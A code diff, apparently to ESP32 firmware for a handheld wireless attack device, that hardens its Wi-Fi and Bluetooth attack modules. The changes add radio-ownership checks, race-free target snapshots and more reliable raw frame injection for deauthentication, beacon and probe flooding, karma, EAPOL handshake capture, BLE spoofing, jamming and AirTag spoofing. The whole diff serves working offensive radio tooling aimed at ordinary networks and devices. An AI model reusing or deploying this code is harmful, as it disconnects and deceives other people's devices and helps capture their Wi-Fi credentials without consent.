@@ -104,12 +104,10 @@ static inline bool radioIsBle(uint8_t o) {
   return o == RADIO_BLE_SCAN || o == RADIO_BLE_ADV;
 }
 
-static void bleForceIdle();
+static void bleForceIdle();  // defined with BLE section
 static void wifiForceIdle();
 
 static bool radioAcquire(uint8_t want) {
-  // Serialize compound claim: no TOCTOU window between observe and own.
-  // Same-domain role switch: force idle peer role then claim (no silent false).
   for (int attempt = 0; attempt < 3; attempt++) {
     portENTER_CRITICAL(&radioMux);
     uint8_t cur = radioOwner;
@@ -125,10 +123,8 @@ static bool radioAcquire(uint8_t want) {
     portEXIT_CRITICAL(&radioMux);
 
     if (sameWifi || sameBle || cross) {
-      // Tear down the holder outside the mux (may delay), then retry claim
       if (radioIsWifi(cur)) wifiForceIdle();
       if (radioIsBle(cur))  bleForceIdle();
-      // Clear owner if still the old one
       portENTER_CRITICAL(&radioMux);
       if (radioOwner == cur) radioOwner = RADIO_NONE;
       radioOwner = want;
@@ -137,7 +133,8 @@ static bool radioAcquire(uint8_t want) {
     }
     delay(1);
   }
-  Serial.printf("[RADIO] acquire fail want=%u owner=%u\n", (unsigned)want, (unsigned)radioOwner);
+  Serial.printf("[RADIO] acquire fail want=%u owner=%u\n",
+                (unsigned)want, (unsigned)radioOwner);
   return false;
 }
 
@@ -431,6 +428,7 @@ static void eapolStop() {
 
 static void eapolUpdate() {
   if (!eapolRunning) return;
+  if (radioOwner != RADIO_WIFI_TX) return;
   if (millis() - eapolLast > 400) {
     eapolLast = millis();
     esp_wifi_set_channel(eapolCh, WIFI_SECOND_CHAN_NONE);
@@ -583,6 +581,7 @@ static void karmaStop() {
 
 static void karmaUpdate() {
   if (!karmaRunning) return;
+  if (radioOwner != RADIO_WIFI_TX) return;
   if (karmaPendingReady) {
     char tmp[33];
     portENTER_CRITICAL(&karmaMux);
@@ -828,7 +827,12 @@ static void wifiScanUpdate() {
   int16_t r = WiFi.scanComplete();
   if (r == WIFI_SCAN_RUNNING) return;
   wifiScanning = false;
-  if (r < 0) { wifiCount = 0; return; }
+  if (r < 0) {
+    wifiCount = 0;
+    radioRelease(RADIO_WIFI_SCAN);
+    if (webMode) restoreWebAP();
+    return;
+  }
 
   portENTER_CRITICAL(&wifiNetsMux);
   wifiCount = min((int)r, WIFI_MAX_NETS);
@@ -1145,6 +1149,7 @@ static void beaconSendOne(const char* ssid, const uint8_t* mac, uint8_t ch, bool
 }
 static void beaconUpdate() {
   if (!beaconRunning) return;
+  if (radioOwner != RADIO_WIFI_TX) return;
   if (millis() - beaconLast < 20) return;
   beaconLast = millis();
 
@@ -1538,11 +1543,7 @@ static void deauthStart(int targetIdx) {
   if (webMode) {
     Serial.println("[DEAUTH] web Soft-AP pins CH1 — leave web mode for off-channel deauth");
   }
-  clientSniffStop();  // keeps clientCount + clientSniffBssid for unicast
-  if (clientCount <= 0)
-    Serial.println("[DEAUTH] no sniffed STAs — broadcast only (run Client Sniffer first)");
-  else
-    Serial.print("[DEAUTH] sniffed STAs ready for unicast: "); Serial.println(clientCount);
+  clientSniffStop();  // stop promisc; keep client list if any
   if (!radioAcquire(RADIO_WIFI_TX)) {
     Serial.println("[DEAUTH] radio busy");
     return;
@@ -1581,9 +1582,11 @@ static void deauthStart(int targetIdx) {
   } else {
     deauthOpenInjectIface(ch);
   }
-  radioSettleRequest(40);
+  radioSettleRequest(50);
   typhoonMaxWifiTx();
   wifiLockChannel(ch);
+  wifiAttackLive = true;  // Core0 must process deauthUpdate
+  delay(5);               // Arduino loop context — not vTaskDelay
 }
 
 static void deauthStop() {
@@ -1603,17 +1606,18 @@ static uint32_t deauthTxFail = 0;
 
 static void deauthTx(const uint8_t* frame) {
   if (!deauthRunning) return;
-  bool ok = false;
+  // Primary path: AP iface (always valid after deauthOpenInjectIface)
   esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, frame, 26, false);
-  if (e == ESP_OK) ok = true;
-  else delay(1);
-  // Dual-inject when STA iface exists (cached at start — no per-frame get_mode)
-  if (deauthCachedMode == WIFI_MODE_STA || deauthCachedMode == WIFI_MODE_APSTA) {
-    e = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
-    if (e == ESP_OK) ok = true;
+  if (e == ESP_OK) {
+    deauthSent++;
+  } else {
+    deauthTxFail++;
+    // optional STA retry only if AP_STA
+    if (deauthCachedMode == WIFI_MODE_APSTA) {
+      e = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
+      if (e == ESP_OK) deauthSent++;
+    }
   }
-  if (ok) deauthSent++;
-  else deauthTxFail++;
 }
 
 static void deauthRestoreWebCh() {
@@ -1636,7 +1640,8 @@ static void deauthSendPair(const uint8_t* ra, const uint8_t* ta, const uint8_t* 
 
 static void deauthUpdate() {
   if (!deauthRunning) return;
-  if (!radioSettled()) return;  // wait mode transition
+  if (radioOwner != RADIO_WIFI_TX) return;
+  if (!radioSettled()) return;
 
   int tgt = deauthTarget;
   int wc;
@@ -1828,7 +1833,9 @@ static void deauthStartAll() {
   }
   wifiLockChannel(wifiTxChannel(startCh));
   deauthLockedCh = startCh;
-  radioSettleRequest(40);
+  radioSettleRequest(50);
+  wifiAttackLive = true;
+  delay(5);  // Arduino loop context
 }
 
 
@@ -1868,6 +1875,7 @@ static void floodSendNoiseBeacon(uint8_t ch) {
 }
 
 static void floodUpdateImpl() {
+  if (radioOwner != RADIO_WIFI_TX) return;
   if (!floodRunning) return;
   // No millis gate: dual-core Option C paces with vTaskDelay(1) in wifiCoreLoop
   floodLast = millis();
@@ -1891,10 +1899,21 @@ static void floodUpdateImpl() {
     return;
   }
 
-  if (floodTarget >= wifiCount) { floodStop(); return; }
-  uint8_t ch = wifiTxChannel(wifiNets[floodTarget].ch);
+  uint8_t bssidSnap[6];
+  uint8_t chRaw;
+  int ft = floodTarget;
+  portENTER_CRITICAL(&wifiNetsMux);
+  if (ft < 0 || ft >= wifiCount) {
+    portEXIT_CRITICAL(&wifiNetsMux);
+    floodStop();
+    return;
+  }
+  chRaw = wifiNets[ft].ch;
+  memcpy(bssidSnap, wifiNets[ft].bssid, 6);
+  portEXIT_CRITICAL(&wifiNetsMux);
+  uint8_t ch = wifiTxChannel(chRaw);
   esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
-  const uint8_t* bssid = wifiNets[floodTarget].bssid;
+  const uint8_t* bssid = bssidSnap;
   if (!floodStickyInit || (floodSent % 32) == 0) {
     for (int i = 0; i < 6; i++) floodStickySta[i] = (uint8_t)esp_random();
     floodStickySta[0] = (floodStickySta[0] | 0x02) & 0xFE;
@@ -1996,19 +2015,33 @@ static void probeStop() {
 
 static void probeUpdate() {
   if (!probeRunning) return;
-  if (probeTarget < 0 || probeTarget >= wifiCount) { probeStop(); return; }
+  if (radioOwner != RADIO_WIFI_TX) return;
   if (millis() - probeLast < 4) return;
   probeLast = millis();
 
-  const char* ssid = wifiNets[probeTarget].ssid.c_str();
-  if (wifiNets[probeTarget].hidden || wifiNets[probeTarget].ssid == "<hidden>") ssid = "";
-  const uint8_t* bssid = wifiNets[probeTarget].bssid;
-  probeCh = wifiTxChannel(wifiNets[probeTarget].ch);
+  char ssidbuf[33];
+  uint8_t bssidSnap[6];
+  uint8_t chSnap;
+  int tgt = probeTarget;
+  portENTER_CRITICAL(&wifiNetsMux);
+  if (tgt < 0 || tgt >= wifiCount) {
+    portEXIT_CRITICAL(&wifiNetsMux);
+    probeStop();
+    return;
+  }
+  const String& s = wifiNets[tgt].ssid;
+  bool hid = wifiNets[tgt].hidden || (s == "<hidden>");
+  size_t n = hid ? 0 : s.length();
+  if (n > 32) n = 32;
+  for (size_t i = 0; i < n; i++) ssidbuf[i] = s[i];
+  ssidbuf[n] = 0;
+  memcpy(bssidSnap, wifiNets[tgt].bssid, 6);
+  chSnap = wifiNets[tgt].ch;
+  portEXIT_CRITICAL(&wifiNetsMux);
 
-  // Sticky MAC for 80 frames then rotate
+  probeCh = wifiTxChannel(chSnap);
   if ((probeSent % 80) == 0) probeRandomMac();
-
-  int len = probeBuildDirected(ssid, bssid, probeCh);
+  int len = probeBuildDirected(ssidbuf, bssidSnap, probeCh);
   esp_wifi_set_channel(probeCh, WIFI_SECOND_CHAN_NONE);
   for (int i = 0; i < 10; i++) {
     esp_wifi_80211_tx(WIFI_IF_AP, probePacket, len, false);
@@ -2169,6 +2202,7 @@ static void stopAllTools() {
   floodStop();
   eapolStop();
   wifiScanning = false;
+  radioRelease(RADIO_WIFI_SCAN);  // stopAllTools must not leak scan ownership
   if (webMode) restoreWebAP();
   else if (warMode) typhoonApplyWarRadio();
 }
@@ -2216,6 +2250,7 @@ static uint32_t bleScanStartedAt = 0;
 static volatile uint32_t blePktCount = 0;
 static volatile bool bleScanParamOk = false;
 static volatile bool bleScanStartPending = false;
+static volatile bool bleForceScanTried = false;
 static volatile bool bleScanStartedOk = false;
 static uint32_t      bleScanDurationSec = 12;
 static uint32_t      bleScanLastUiPkts = 0;
@@ -2249,6 +2284,14 @@ static void wifiForceIdle() {
 
 // Tear down BLE scan/ADV so Wi-Fi can own the RF path
 static void bleForceIdle() {
+  if (!bleReady) {
+    bleScanning = false;
+    bleScanStartPending = false;
+    bleScanDone = true;
+    bleAdvPendingStart = false;
+    bleAdvBusy = false;
+    return;
+  }
   esp_ble_gap_stop_scanning();
   esp_ble_gap_stop_advertising();
   bleScanning = false;
@@ -2256,9 +2299,9 @@ static void bleForceIdle() {
   bleScanDone = true;
   bleAdvPendingStart = false;
   bleAdvBusy = false;
-  // Wait for controller; GAP STOP events will also clear flags
   delay(50);
 }
+
 
 
 
@@ -2315,6 +2358,7 @@ static void bleResumeWifiAfterScan() {
     WiFi.mode(WIFI_STA);
     WiFi.disconnect(false, false);
   }
+  radioSettleRequest(30);
 }
 
 
@@ -2707,6 +2751,7 @@ static void bleScanStartEx(uint32_t durationSec) {
   bleScanDurationSec = durationSec;
   bleScanning = true;
   bleScanStartPending = true;
+  bleForceScanTried = false;
   bleScanStartedAt = millis();
 
   // Official: only set_scan_params here; start_scanning in SCAN_PARAM_SET_COMPLETE_EVT
@@ -2738,10 +2783,11 @@ static void bleScanUpdate() {
     }
   }
 
-  // If PARAM_SET_COMPLETE never arrived, force start once (controller lag)
-  if (bleScanStartPending && bleScanning &&
-      (millis() - bleScanStartedAt > 500)) {
-    Serial.println("[BLE] param-complete timeout → force start_scanning");
+  // PARAM_SET_COMPLETE can lag 600-800ms on cold Bluedroid — wait 1500ms, fire once
+  if (bleScanStartPending && bleScanning && !bleForceScanTried &&
+      (millis() - bleScanStartedAt > 1500)) {
+    bleForceScanTried = true;
+    Serial.println("[BLE] param-complete timeout → force start_scanning once");
     bleScanStartPending = false;
     esp_err_t e2 = esp_ble_gap_start_scanning(bleScanDurationSec);
     Serial.printf("[BLE] force start -> %s\n", esp_err_to_name(e2));
@@ -2835,6 +2881,8 @@ static esp_ble_adv_params_t bleAdvParams = {
 };
 
 static void spoofStart() {
+  bleAttackLive = true;  // ensure BLE core processes this attack
+
   bleInit();
   if (bleScanning) { esp_ble_gap_stop_scanning(); bleScanning = false; }
   spoofRunning = true;
@@ -2922,6 +2970,8 @@ static uint32_t jamLast = 0;
 static uint32_t jamCount = 0;
 
 static void jamStart() {
+  bleAttackLive = true;  // ensure BLE core processes this attack
+
   sniffStop(); spoofStop(); sourStop(); airSpoofStop();
   if (bleScanning) { esp_ble_gap_stop_scanning(); bleScanning = false; }
   if (!radioAcquire(RADIO_BLE_ADV)) {
@@ -3152,10 +3202,10 @@ static void sourBuildPacket(uint8_t* packet, uint8_t* plen, int typeIdx) {
   *plen = i;  // 17
 }
 
+static void sourBeginAdvertise();
 static void sourStart() {
-  sourRunning = false;
-  sourLast = 0;
-  sourSent = 0;
+  // Full arm: sourBeginAdvertise sets sourRunning after radio is ready
+  sourBeginAdvertise();
 }
 
 static void sourStop() {
@@ -3169,6 +3219,8 @@ static void sourStop() {
 static uint16_t sourIntervalMs = 80;
 
 static void sourBeginAdvertise() {
+  bleAttackLive = true;
+  if (sourRunning) return;  // already armed (sourStart may have called us)
   sniffStop();
   spoofStop();
   jamStop();
@@ -3402,6 +3454,8 @@ static void airSpoofStop() {
 }
 
 static void airSpoofStart(int targetIdx) {
+  bleAttackLive = true;  // ensure BLE core processes this attack
+
   if (airTagCount <= 0) return;
   if (targetIdx >= airTagCount) targetIdx = 0;
   airDetStop();
@@ -5322,23 +5376,11 @@ static void drawDeauthScreen(int sel, int top) {
     char buf[28];
     snprintf(buf, sizeof(buf), "Sent %lu", (unsigned long)deauthSent);
     Theme::printCentered(buf, 60, COL_DIM, 1);
-    // Unicast depends on Client Sniffer for this AP
-    bool haveCli = false;
-    if (clientCount > 0) {
-      if (deauthTarget == -2) haveCli = true;
-      else if (deauthTarget >= 0 && deauthTarget < wifiCount) {
-        portENTER_CRITICAL(&wifiNetsMux);
-        haveCli = (memcmp(wifiNets[deauthTarget].bssid, clientSniffBssid, 6) == 0);
-        portEXIT_CRITICAL(&wifiNetsMux);
-      }
-    }
-    if (haveCli)
-      snprintf(buf, sizeof(buf), "Unicast %d STAs", clientCount > 48 ? 48 : clientCount);
-    else if (clientCount > 0)
-      snprintf(buf, sizeof(buf), "STAs=other AP");
+    if (deauthTxFail)
+      snprintf(buf, sizeof(buf), "fail %lu", (unsigned long)deauthTxFail);
     else
-      snprintf(buf, sizeof(buf), "Bcast only-sniff 1st");
-    Theme::printCentered(buf, 76, haveCli ? COL_OK : COL_WARN, 1);
+      snprintf(buf, sizeof(buf), "CH %u", (unsigned)deauthLockedCh);
+    Theme::printCentered(buf, 76, COL_DIM, 1);
     drawActivityFooter();
   } else if (wifiCount == 0) {
     Theme::printCentered("No scan data", 50, COL_WARN, 1);
